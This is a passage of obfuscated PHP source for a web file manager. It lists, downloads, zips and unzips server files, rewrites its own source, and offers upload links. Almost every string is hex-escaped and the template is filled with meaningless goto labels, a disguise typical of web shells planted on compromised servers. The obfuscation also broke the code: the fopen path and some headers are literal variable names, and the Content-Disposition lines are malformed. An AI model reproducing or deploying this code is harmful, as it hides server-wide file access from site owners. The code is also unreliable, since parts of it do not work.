        case "\x6D\160\x32":
        case "\x6D\064\x61":
        case "\x61\141\x63":
        case "\x6F\147\x67":
        case "\x6F\147\x61":
        case "\x77\155\x61":
        case "\x6D\153\x61":
        case "\x66\154\x61\143":
        case "\x61\143\x33":
        case "\x74\144\x73":
            $img = "\x66\141\x20\146\x61\055\x6D\165\x73\151\x63";
            break;
        case "\x6D\063\x75":
        case "\x6D\063\x75\070":
        case "\x70\154\x73":
        case "\x63\165\x65":
        case "\x78\163\x70\146":
            $img = "\x66\141\x20\146\x61\055\x68\145\x61\144\x70\150\x6F\156\x65\163";
            break;
        case "\x61\166\x69":
        case "\x6D\160\x67":
        case "\x6D\160\x65\147":
        case "\x6D\160\x34":
        case "\x6D\064\x76":
        case "\x66\154\x76":
        case "\x66\064\x76":
        case "\x6F\147\x6D":
        case "\x6F\147\x76":
        case "\x6D\157\x76":
        case "\x6D\153\x76":
        case "\x33\147\x70":
        case "\x61\163\x66":
        case "\x77\155\x76":
        case "\x77\145\x62\155":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\166\x69\144\x65\157\x2D\157";
            break;
        case "\x65\155\x6C":
        case "\x6D\163\x67":
            $img = "\x66\141\x20\146\x61\055\x65\156\x76\145\x6C\157\x70\145\x2D\157";
            break;
        case "\x78\154\x73":
        case "\x78\154\x73\170":
        case "\x6F\144\x73":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\145\x78\143\x65\154\x2D\157";
            break;
        case "\x63\163\x76":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\164\x65\170\x74\055\x6F";
            break;
        case "\x62\141\x6B":
        case "\x73\167\x70":
            $img = "\x66\141\x20\146\x61\055\x63\154\x69\160\x62\157\x61\162\x64";
            break;
        case "\x64\157\x63":
        case "\x64\157\x63\170":
        case "\x6F\144\x74":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\167\x6F\162\x64\055\x6F";
            break;
        case "\x70\160\x74":
        case "\x70\160\x74\170":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\160\x6F\167\x65\162\x70\157\x69\156\x74\055\x6F";
            break;
        case "\x74\164\x66":
        case "\x74\164\x63":
        case "\x6F\164\x66":
        case "\x77\157\x66\146":
        case "\x77\157\x66\146\x32":
        case "\x65\157\x74":
        case "\x66\157\x6E":
            $img = "\x66\141\x20\146\x61\055\x66\157\x6E\164";
            break;
        case "\x70\144\x66":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\160\x64\146\x2D\157";
            break;
        case "\x70\163\x64":
        case "\x61\151":
        case "\x65\160\x73":
        case "\x66\154\x61":
        case "\x73\167\x66":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\151\x6D\141\x67\145\x2D\157";
            break;
        case "\x65\170\x65":
        case "\x6D\163\x69":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\157";
            break;
        case "\x62\141\x74":
            $img = "\x66\141\x20\146\x61\055\x74\145\x72\155\x69\156\x61\154";
            break;
        default:
            $img = "\x66\141\x20\146\x61\055\x69\156\x66\157\x2D\143\x69\162\x63\154\x65";
    }

    return $img;
}

function fm_get_image_exts()
{
    return array("\x69\143\x6F", "\x67\151\x66", "\x6A\160\x67", "\x6A\160\x65\147", "\x6A\160\x63", "\x6A\160\x32", "\x6A\160\x78", "\x78\142\x6D", "\x77\142\x6D\160", "\x70\156\x67", "\x62\155\x70", "\x74\151\x66", "\x74\151\x66\146", "\x70\163\x64", "\x73\166\x67", "\x77\145\x62\160", "\x61\166\x69\146");
}

function fm_get_video_exts()
{
    return array("\x61\166\x69", "\x77\145\x62\155", "\x77\155\x76", "\x6D\160\x34", "\x6D\064\x76", "\x6F\147\x6D", "\x6F\147\x76", "\x6D\157\x76", "\x6D\153\x76");
}

function fm_get_audio_exts()
{
    return array("\x77\141\x76", "\x6D\160\x33", "\x6F\147\x67", "\x6D\064\x61");
}

function fm_get_text_exts()
{
    return array(
        "\x74\170\x74", "\x63\163\x73", "\x69\156\x69", "\x63\157\x6E\146", "\x6C\157\x67", "\x68\164\x61\143\x63\145\x73\163", "\x70\141\x73\163\x77\144", "\x66\164\x70\161\x75\157\x74\141", "\x73\161\x6C", "\x6A\163", "\x74\163", "\x6A\163\x78", "\x74\163\x78", "\x6D\152\x73", "\x6A\163\x6F\156", "\x73\150", "\x63\157\x6E\146\x69\147",
        "\x70\150\x70", "\x70\150\x70\064", "\x70\150\x70\065", "\x70\150\x70\163", "\x70\150\x74\155\x6C", "\x68\164\x6D", "\x68\164\x6D\154", "\x73\150\x74\155\x6C", "\x78\150\x74\155\x6C", "\x78\155\x6C", "\x78\163\x6C", "\x6D\063\x75", "\x6D\063\x75\070", "\x70\154\x73", "\x63\165\x65", "\x62\141\x73\150", "\x76\165\x65",
        "\x65\155\x6C", "\x6D\163\x67", "\x63\163\x76", "\x62\141\x74", "\x74\167\x69\147", "\x74\160\x6C", "\x6D\144", "\x67\151\x74\151\x67\156\x6F\162\x65", "\x6C\145\x73\163", "\x73\141\x73\163", "\x73\143\x73\163", "\x63", "\x63\160\x70", "\x63\163", "\x70\171", "\x67\157", "\x7A\163\x68", "\x73\167\x69\146\x74",
        "\x6D\141\x70", "\x6C\157\x63\153", "\x64\164\x64", "\x73\166\x67", "\x61\163\x70", "\x61\163\x70\170", "\x61\163\x78", "\x61\163\x6D\170", "\x61\163\x68\170", "\x6A\163\x70", "\x6A\163\x70\170", "\x63\147\x69", "\x64\157\x63\153\x65\162\x66\151\x6C\145", "\x72\165\x62\171", "\x79\155\x6C", "\x79\141\x6D\154", "\x74\157\x6D\154",
        "\x76\150\x6F\163\x74", "\x73\143\x70\164", "\x61\160\x70\154\x65\163\x63\162\x69\160\x74", "\x63\163\x78", "\x63\163\x68\164\x6D\154", "\x63\053\x2B", "\x63\157\x66\146\x65\145", "\x63\146\x6D", "\x72\142", "\x67\162\x61\160\x68\161\x6C", "\x6D\165\x73\164\x61\143\x68\145", "\x6A\151\x6E\152\x61", "\x68\164\x74\160", "\x68\141\x6E\144\x6C\145\x62\141\x72\163",
        "\x6A\141\x76\141", "\x65\163", "\x65\163\x36", "\x6D\141\x72\153\x64\157\x77\156", "\x77\151\x6B\151", "\x74\155\x70", "\x74\157\x70", "\x62\157\x74", "\x64\141\x74", "\x62\141\x6B", "\x68\164\x70\141\x73\163\x77\144", "\x70\154"
    );
}

function fm_get_text_mimes()
{
    return array(
        "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x78\155\x6C",
        "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6A\141\x76\141\x73\143\x72\151\x70\164",
        "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x78\055\x6A\141\x76\141\x73\143\x72\151\x70\164",
        "\x69\155\x61\147\x65\057\x73\166\x67\053\x78\155\x6C",
        "\x6D\145\x73\163\x61\147\x65\057\x72\146\x63\070\x32\062",
        "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6A\163\x6F\156",
    );
}

function fm_get_text_names()
{
    return array(
        "\x6C\151\x63\145\x6E\163\x65",
        "\x72\145\x61\144\x6D\145",
        "\x61\165\x74\150\x6F\162\x73",
        "\x63\157\x6E\164\x72\151\x62\165\x74\157\x72\163",
        "\x63\150\x61\156\x67\145\x6C\157\x67",
    );
}

function fm_get_onlineViewer_exts()
{
    return array("\x64\157\x63", "\x64\157\x63\170", "\x78\154\x73", "\x78\154\x73\170", "\x70\144\x66", "\x70\160\x74", "\x70\160\x74\170", "\x61\151", "\x70\163\x64", "\x64\170\x66", "\x78\160\x73", "\x72\141\x72", "\x6F\144\x74", "\x6F\144\x73");
}

function fm_get_file_mimes($extension)
{
    $fileTypes["\x73\167\x66"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x78\055\x73\150\x6F\143\x6B\167\x61\166\x65\055\x66\154\x61\163\x68";
    $fileTypes["\x70\144\x66"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x70\144\x66";
    $fileTypes["\x65\170\x65"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6F\143\x74\145\x74\055\x73\164\x72\145\x61\155";
    $fileTypes["\x7A\151\x70"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x7A\151\x70";
    $fileTypes["\x64\157\x63"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6D\163\x77\157\x72\144";
    $fileTypes["\x78\154\x73"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x76\156\x64\056\x6D\163\x2D\145\x78\143\x65\154";
    $fileTypes["\x70\160\x74"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x76\156\x64\056\x6D\163\x2D\160\x6F\167\x65\162\x70\157\x69\156\x74";
    $fileTypes["\x67\151\x66"] = "\x69\155\x61\147\x65\057\x67\151\x66";
    $fileTypes["\x70\156\x67"] = "\x69\155\x61\147\x65\057\x70\156\x67";
    $fileTypes["\x6A\160\x65\147"] = "\x69\155\x61\147\x65\057\x6A\160\x67";
    $fileTypes["\x6A\160\x67"] = "\x69\155\x61\147\x65\057\x6A\160\x67";
    $fileTypes["\x77\145\x62\160"] = "\x69\155\x61\147\x65\057\x77\145\x62\160";
    $fileTypes["\x61\166\x69\146"] = "\x69\155\x61\147\x65\057\x61\166\x69\146";
    $fileTypes["\x72\141\x72"] = "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x72\141\x72";

    $fileTypes["\x72\141"] = "\x61\165\x64\151\x6F\057\x78\055\x70\156\x2D\162\x65\141\x6C\141\x75\144\x69\157";
    $fileTypes["\x72\141\x6D"] = "\x61\165\x64\151\x6F\057\x78\055\x70\156\x2D\162\x65\141\x6C\141\x75\144\x69\157";
    $fileTypes["\x6F\147\x67"] = "\x61\165\x64\151\x6F\057\x78\055\x70\156\x2D\162\x65\141\x6C\141\x75\144\x69\157";

    $fileTypes["\x77\141\x76"] = "\x76\151\x64\145\x6F\057\x78\055\x6D\163\x76\151\x64\145\x6F";
    $fileTypes["\x77\155\x76"] = "\x76\151\x64\145\x6F\057\x78\055\x6D\163\x76\151\x64\145\x6F";
    $fileTypes["\x61\166\x69"] = "\x76\151\x64\145\x6F\057\x78\055\x6D\163\x76\151\x64\145\x6F";
    $fileTypes["\x61\163\x66"] = "\x76\151\x64\145\x6F\057\x78\055\x6D\163\x76\151\x64\145\x6F";
    $fileTypes["\x64\151\x76\170"] = "\x76\151\x64\145\x6F\057\x78\055\x6D\163\x76\151\x64\145\x6F";

    $fileTypes["\x6D\160\x33"] = "\x61\165\x64\151\x6F\057\x6D\160\x65\147";
    $fileTypes["\x6D\160\x34"] = "\x61\165\x64\151\x6F\057\x6D\160\x65\147";
    $fileTypes["\x6D\160\x65\147"] = "\x76\151\x64\145\x6F\057\x6D\160\x65\147";
    $fileTypes["\x6D\160\x67"] = "\x76\151\x64\145\x6F\057\x6D\160\x65\147";
    $fileTypes["\x6D\160\x65"] = "\x76\151\x64\145\x6F\057\x6D\160\x65\147";
    $fileTypes["\x6D\157\x76"] = "\x76\151\x64\145\x6F\057\x71\165\x69\143\x6B\164\x69\155\x65";
    $fileTypes["\x73\167\x66"] = "\x76\151\x64\145\x6F\057\x71\165\x69\143\x6B\164\x69\155\x65";
    $fileTypes["\x33\147\x70"] = "\x76\151\x64\145\x6F\057\x71\165\x69\143\x6B\164\x69\155\x65";
    $fileTypes["\x6D\064\x61"] = "\x76\151\x64\145\x6F\057\x71\165\x69\143\x6B\164\x69\155\x65";
    $fileTypes["\x61\141\x63"] = "\x76\151\x64\145\x6F\057\x71\165\x69\143\x6B\164\x69\155\x65";
    $fileTypes["\x6D\063\x75"] = "\x76\151\x64\145\x6F\057\x71\165\x69\143\x6B\164\x69\155\x65";

    $fileTypes["\x70\150\x70"] = ["\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x78\055\x70\150\x70"];
    $fileTypes["\x68\164\x6D\154"] = ["\x74\145\x78\164\x2F\150\x74\155\x6C"];
    $fileTypes["\x74\170\x74"] = ["\x74\145\x78\164\x2F\160\x6C\141\x69\156"];
    //Unknown mime-types should be "\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6F\143\x74\145\x74\055\x73\164\x72\145\x61\155"
    if(empty($fileTypes[$extension])) {
      $fileTypes[$extension] = ["\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6F\143\x74\145\x74\055\x73\164\x72\145\x61\155"];
    }
    return $fileTypes[$extension];
}

 function scan($dir = "", $filter = "") {
    $path = FM_ROOT_PATH."\x2F".$dir;
     if($path) {
         $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
         $rii = new RegexIterator($ite, "\x2F\050" . $filter . "\x29\057\x69");

         $files = array();
         foreach ($rii as $file) {
             if (!$file->isDir()) {
                 $fileName = $file->getFilename();
                 $location = str_replace(FM_ROOT_PATH, "", $file->getPath());
                 $files[] = array(
                     "\x6E\141\x6D\145" => $fileName,
                     "\x74\171\x70\145" => "\x66\151\x6C\145",
                     "\x70\141\x74\150" => $location,
                 );
             }
         }
         return $files;
     }
}

function fm_download_file($fileLocation, $fileName, $chunkSize  = 1024)
{
    if (connection_status() != 0)
        return (false);
    $extension = pathinfo($fileName, PATHINFO_EXTENSION);

    $contentType = fm_get_file_mimes($extension);

    if(is_array($contentType)) {
        $contentType = implode("\x20", $contentType);
    }

    $size = filesize($fileLocation);

    if ($size == 0) {
        fm_set_msg(lng("\x5A\145\x72\157\x20\142\x79\164\x65\040\x66\151\x6C\145\x21\040\x41\142\x6F\162\x74\151\x6E\147\x20\144\x6F\167\x6E\154\x6F\141\x64"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));

        return (false);
    }

    @ini_set("\x6D\141\x67\151\x63\137\x71\165\x6F\164\x65\163\x5F\162\x75\156\x74\151\x6D\145", 0);
    $fp = fopen("\x24\146\x69\154\x65\114\x6F\143\x61\164\x69\157\x6E", "\x72\142");

    if ($fp === false) {
        fm_set_msg(lng("\x43\141\x6E\156\x6F\164\x20\157\x70\145\x6E\040\x66\151\x6C\145\x21\040\x41\142\x6F\162\x74\151\x6E\147\x20\144\x6F\167\x6E\154\x6F\141\x64"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
        return (false);
    }

    header("\x43\157\x6E\164\x65\156\x74\055\x44\145\x73\143\x72\151\x70\164\x69\157\x6E\072\x20\106\x69\154\x65\040\x54\162\x61\156\x73\146\x65\162");
    header("\x45\170\x70\151\x72\145\x73\072\x20\060");
    header("\x43\141\x63\150\x65\055\x43\157\x6E\164\x72\157\x6C\072\x20\155\x75\163\x74\055\x72\145\x76\141\x6C\151\x64\141\x74\145\x2C\040\x70\157\x73\164\x2D\143\x68\145\x63\153\x3D\060\x2C\040\x70\162\x65\055\x63\150\x65\143\x6B\075\x30");
    header("\x50\162\x61\147\x6D\141\x3A\040\x70\165\x62\154\x69\143");
    header("\x43\157\x6E\164\x65\156\x74\055\x54\162\x61\156\x73\146\x65\162\x2D\105\x6E\143\x6F\144\x69\156\x67\072\x20\142\x69\156\x61\162\x79");
    header("\x43\157\x6E\164\x65\156\x74\055\x54\171\x70\145\x3A\040\x24\143\x6F\156\x74\145\x6E\164\x54\171\x70\145");

    $contentDisposition = "\x61\164\x74\141\x63\150\x6D\145\x6E\164";

    if (strstr($_SERVER["\x48\124\x54\120\x5F\125\x53\105\x52\137\x41\107\x45\116\x54"], "\x4D\123\x49\105")) {
        $fileName = preg_replace("\x2F\134\x2E\057", "\x25\062\x65", $fileName, substr_count($fileName, "\x2E") - 1);
        header("\x43\157\x6E\164\x65\156\x74\055\x44\151\x73\160\x6F\163\x69\164\x69\157\x6E\072\x20\044\x63\157\x6E\164\x65\156\x74\104\x69\163\x70\157\x73\151\x74\151\x6F\156\x3B\146\x69\154\x65\156\x61\155\x65\075\x5C"$fileName\"");
    } else {
        header("\x43\157\x6E\164\x65\156\x74\055\x44\151\x73\160\x6F\163\x69\164\x69\157\x6E\072\x20\044\x63\157\x6E\164\x65\156\x74\104\x69\163\x70\157\x73\151\x74\151\x6F\156\x3B\146\x69\154\x65\156\x61\155\x65\075\x5C"$fileName\"");
    }

    header("\x41\143\x63\145\x70\164\x2D\122\x61\156\x67\145\x73\072\x20\142\x79\164\x65\163");
    $range = 0;

    if (isset($_SERVER["\x48\124\x54\120\x5F\122\x41\116\x47\105"])) {
        list($a, $range) = explode("\x3D", $_SERVER["\x48\124\x54\120\x5F\122\x41\116\x47\105"]);
        str_replace($range, "\x2D", $range);
        $size2 = $size - 1;
        $new_length = $size - $range;
        header("\x48\124\x54\120\x2F\061\x2E\061\x20\062\x30\066\x20\120\x61\162\x74\151\x61\154\x20\103\x6F\156\x74\145\x6E\164");
        header("\x43\157\x6E\164\x65\156\x74\055\x4C\145\x6E\147\x74\150\x3A\040\x24\156\x65\167\x5F\154\x65\156\x67\164\x68");
        header("\x43\157\x6E\164\x65\156\x74\055\x52\141\x6E\147\x65\072\x20\142\x79\164\x65\163\x20\044\x72\141\x6E\147\x65\044\x73\151\x7A\145\x32\057\x24\163\x69\172\x65");
    } else {
        $size2 = $size - 1;
        header("\x43\157\x6E\164\x65\156\x74\055\x52\141\x6E\147\x65\072\x20\142\x79\164\x65\163\x20\060\x2D\044\x73\151\x7A\145\x32\057\x24\163\x69\172\x65");
        header("\x43\157\x6E\164\x65\156\x74\055\x4C\145\x6E\147\x74\150\x3A\040" . $size);
    }
    $fileLocation = realpath($fileLocation);
    while (ob_get_level()) ob_end_clean();
    readfile($fileLocation);

    fclose($fp);

    return ((connection_status() == 0) and !connection_aborted());
}
function fm_get_theme() {
    $result = "";
    if(FM_THEME == "\x64\141\x72\153") {
        $result = "\x74\145\x78\164\x2D\167\x68\151\x74\145\x20\142\x67\055\x64\141\x72\153";
    }
    return $result;
}

class FM_Zipper
{
    private $zip;

    public function __construct()
    {
        $this->zip = new ZipArchive();
    }
    public function create($filename, $files)
    {
        $res = $this->zip->open($filename, ZipArchive::CREATE);
        if ($res !== true) {
            return false;
        }
        if (is_array($files)) {
            foreach ($files as $f) {
                $f = fm_clean_path($f);
                if (!$this->addFileOrDir($f)) {
                    $this->zip->close();
                    return false;
                }
            }
            $this->zip->close();
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                $this->zip->close();
                return true;
            }
            return false;
        }
    }
    public function unzip($filename, $path)
    {
        $res = $this->zip->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->zip->extractTo($path)) {
            $this->zip->close();
            return true;
        }
        return false;
    }
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            return $this->zip->addFile($filename);
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }
    private function addDir($path)
    {
        if (!$this->zip->addEmptyDir($path)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != "\x2E" && $file != "\x2E\056") {
                    if (is_dir($path . "\x2F" . $file)) {
                        if (!$this->addDir($path . "\x2F" . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . "\x2F" . $file)) {
                        if (!$this->zip->addFile($path . "\x2F" . $file)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

class FM_Zipper_Tar
{
    private $tar;

    public function __construct()
    {
        $this->tar = null;
    }
    public function create($filename, $files)
    {
        $this->tar = new PharData($filename);
        if (is_array($files)) {
            foreach ($files as $f) {
                $f = fm_clean_path($f);
                if (!$this->addFileOrDir($f)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                return true;
            }
            return false;
        }
    }
    public function unzip($filename, $path)
    {
        $res = $this->tar->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->tar->extractTo($path)) {
            return true;
        }
        return false;
    }
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            try {
                $this->tar->addFile($filename);
                return true;
            } catch (Exception $e) {
                return false;
            }
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }
    private function addDir($path)
    {
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != "\x2E" && $file != "\x2E\056") {
                    if (is_dir($path . "\x2F" . $file)) {
                        if (!$this->addDir($path . "\x2F" . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . "\x2F" . $file)) {
                        try {
                            $this->tar->addFile($path . "\x2F" . $file);
                        } catch (Exception $e) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

 class FM_Config
{
     var $data;

    function __construct()
    {
        global $root_path, $root_url, $CONFIG;
        $fm_url = $root_url.$_SERVER["\x50\110\x50\137\x53\105\x4C\106"];
        $this->data = array(
            "\x6C\141\x6E\147" => "\x65\156",
            "\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67" => true,
            "\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E" => true
        );
        $data = false;
        if (strlen($CONFIG)) {
            $data = fm_object_to_array(json_decode($CONFIG));
        } else {
            $msg = "\x45\162\x72\157\x72\072\x20\103\x61\156\x6E\157\x74\040\x6C\157\x61\144\x20\143\x6F\156\x66\151\x67\165\x72\141\x74\151\x6F\156";
            if (substr($fm_url, -1) == "\x2F") {
                $fm_url = rtrim($fm_url, "\x2F");
                $msg .= "\x3C\142\x72\076";
                $msg .= "\x3C\142\x72\076\x53\145\x65\155\x73\040\x6C\151\x6B\145\x20\171\x6F\165\x20\150\x61\166\x65\040\x61\040\x74\162\x61\151\x6C\151\x6E\147\x20\163\x6C\141\x73\150\x20\157\x6E\040\x74\150\x65\040\x55\122\x4C\056";
                $msg .= "\x3C\142\x72\076\x54\162\x79\040\x74\150\x69\163\x20\154\x69\156\x6B\072\x20\074\x61\040\x68\162\x65\146\x3D\042" . $fm_url . "\x22\076" . $fm_url . "\x3C\057\x61\076";
            }
            die($msg);
        }
        if (is_array($data) && count($data)) $this->data = $data;
        else $this->save();
    }

    function save()
    {
        $fm_file = __FILE__;
        $var_name = "\x24\103\x4F\116\x46\111\x47";
        $var_value = var_export(json_encode($this->data), true);
        $config_string = "\x3C\077\x70\150\x70" . chr(13) . chr(10) . "\x2F\057\x44\145\x66\141\x75\154\x74\040\x43\157\x6E\146\x69\147\x75\162\x61\164\x69\157\x6E".chr(13) . chr(10)."\x24\166\x61\162\x5F\156\x61\155\x65\040\x3D\040\x24\166\x61\162\x5F\166\x61\154\x75\145\x3B" . chr(13) . chr(10);
        if (is_writable($fm_file)) {
            $lines = file($fm_file);
            if ($fh = @fopen($fm_file, "\x77")) {
                @fputs($fh, $config_string, strlen($config_string));
                for ($x = 3; $x < count($lines); $x++) {
                    @fputs($fh, $lines[$x], strlen($lines[$x]));
                }
                @fclose($fh);
            }
        }
    }
}

function fm_show_nav_path($path)
{
    global $lang, $sticky_navbar, $editFile;
    $isStickyNavBar = $sticky_navbar ? "\x66\151\x78\145\x64\055\x74\157\x70" : "";
    $getTheme = fm_get_theme();
    $getTheme .= "\x20\156\x61\166\x62\141\x72\055\x64\141\x72\153";
    if(FM_THEME == "\x64\141\x72\153") {
        $getTheme .= "\x20\156\x61\166\x62\141\x72\055\x64\141\x72\153";
    } else {
        $getTheme .= "\x20\142\x67\055\x77\150\x69\164\x65";
    } ?>
    <nav class="navbar navbar-expand-lg <?php goto opet_1d1b0; opet_1d1b0: echo $getTheme; ?> mb-4 main-nav <?php goto opet_1d1b2; opet_1d1b2: echo $isStickyNavBar ?>">
        <a class="navbar-brand"> <?php goto opet_1d1b6; opet_1d1b6: echo lng("\x41\160\x70\124\x69\164\x6C\145") ?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php goto opet_1d1dd; opet_1d1dd: $path = fm_clean_path($path);
            $root_url = "\x3C\141\x20\150\x72\145\x66\075\x27\077\x70\075\x27\076\x3C\151\x20\143\x6C\141\x73\163\x3D\047\x66\141\x20\146\x61\055\x68\157\x6D\145\x27\040\x61\162\x69\141\x2D\150\x69\144\x64\145\x6E\075\x27\164\x72\165\x65\047\x20\164\x69\164\x6C\145\x3D\047" . FM_ROOT_PATH . "\x27\076\x3C\057\x69\076\x3C\057\x61\076";
            $sep = "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x62\162\x65\141\x64\055\x63\162\x75\155\x62\042\x3E\040\x2F\040\x3C\057\x69\076";
            if ($path != "") {
                $exploded = explode("\x2F", $path);
                $count = count($exploded);
                $array = array();
                $parent = "";
                for ($i = 0; $i < $count; $i++) {
                    $parent = trim($parent . "\x2F" . $exploded[$i], "\x2F");
                    $parent_enc = urlencode($parent);
                    $array[] = "\x3C\141\x20\150\x72\145\x66\075\x27\077\x70\075\x7B\044\x70\141\x72\145\x6E\164\x5F\145\x6E\143\x7D\047\x3E" . fm_enc(fm_convert_win($exploded[$i])) . "\x3C\057\x61\076";
                }
                $root_url .= $sep . implode($sep, $array);
            }
            echo "\x3C\144\x69\166\x20\143\x6C\141\x73\163\x3D\042\x63\157\x6C\055\x78\163\x2D\066\x20\143\x6F\154\x2D\163\x6D\055\x35\042\x3E" . $root_url . $editFile . "\x3C\057\x64\151\x76\076"; ?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end <?php goto opet_1d1df; opet_1d1df: echo fm_get_theme(); ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php goto opet_1d1e2; opet_1d1e2: echo lng("\x53\145\x61\162\x63\150") ?>" aria-label="<?php goto opet_1d1e5; opet_1d1e5: echo lng("\x53\145\x61\162\x63\150") ?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                  <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php goto opet_1d1e7; opet_1d1e7: echo $path2 = $path ? $path : "\x2E"; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php goto opet_1d1ec; opet_1d1ec: echo lng("\x41\144\x76\141\x6E\143\x65\144\x20\123\x65\141\x72\143\x68") ?></a>
                                  </div>
                            </div>
                        </div>
                    </li>
                    <?php goto opet_1d1ed; opet_1d1ed: if (!FM_READONLY): ?>
                    <li class="nav-item">
                        <a title="<?php goto opet_1d1f0; opet_1d1f0: echo lng("\x55\160\x6C\157\x61\144") ?>" class="nav-link" href="?p=<?php goto opet_1d1f2; opet_1d1f2: echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php goto opet_1d1f4; opet_1d1f4: echo lng("\x55\160\x6C\157\x61\144") ?></a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php goto opet_1d1f7; opet_1d1f7: echo lng("\x4E\145\x77\111\x74\145\x6D") ?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php goto opet_1d1fb; opet_1d1fb: echo lng("\x4E\145\x77\111\x74\145\x6D") ?></a>
                    </li>
                    <?php goto opet_1d1fc; opet_1d1fc: endif; ?>
                    <?php goto opet_1d1fd; opet_1d1fd: if (FM_USE_AUTH): ?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php goto opet_1d202; opet_1d202: if(isset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"])) { echo $_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]; } ?></a>
                        <div class="dropdown-menu text-small shadow <?php goto opet_1d204; opet_1d204: echo fm_get_theme(); ?>" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php goto opet_1d205; opet_1d205: if (!FM_READONLY): ?>
                            <?php goto opet_1d207; opet_1d207: endif ?>
                            <a title="<?php goto opet_1d20a; opet_1d20a: echo lng("\x4C\157\x67\157\x75\164") ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php goto opet_1d20c; opet_1d20c: echo lng("\x4C\157\x67\157\x75\164") ?></a>
                        </div>
                    </li>
                    <?php goto opet_1d20e; opet_1d20e: else: ?>
                        <?php goto opet_1d20f; opet_1d20f: if (!FM_READONLY): ?>
                            <li class="nav-item">
                                <a title="<?php goto opet_1d212; opet_1d212: echo lng("\x53\145\x74\164\x69\156\x67\163") ?>" class="dropdown-item nav-link" href="?p=<?php goto opet_1d213; opet_1d213: echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php goto opet_1d216; opet_1d216: echo lng("\x53\145\x74\164\x69\156\x67\163") ?></a>
                            </li>
                        <?php goto opet_1d217; opet_1d217: endif; ?>
                    <?php goto opet_1d219; opet_1d219: endif; ?>
                </ul>
            </div>
        </div>
    </nav>
    <?php goto opet_1d24b; opet_1d24b: }

function fm_show_message()
{
